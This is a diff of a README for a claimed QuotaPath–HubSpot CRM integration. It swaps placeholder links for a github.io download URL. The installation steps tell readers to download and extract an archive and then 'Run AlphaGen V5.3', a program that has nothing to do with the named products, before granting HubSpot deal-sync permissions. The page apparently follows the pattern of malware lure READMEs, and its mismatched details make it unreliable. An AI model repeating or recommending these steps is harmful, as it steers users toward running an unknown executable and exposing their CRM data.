@@ -2,13 +2,13 @@
 
 Connect QuotaPath with HubSpot CRM to automate commission tracking, visualize earnings, and align sales performance with revenue data.
 
-[![Download](https://img.shields.io/badge/Download-QuotaPath_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-QuotaPath_HubSpot_Integration-blueviolet)](https://quotapath-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://quotapath-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract the files to your preferred directory  
 3. 🖱 Run AlphaGen V5.3 to activate the QuotaPath integration module  
 4. ✅ In HubSpot, go to `Settings > Integrations > QuotaPath` and connect your account with pipeline/deal sync permissions
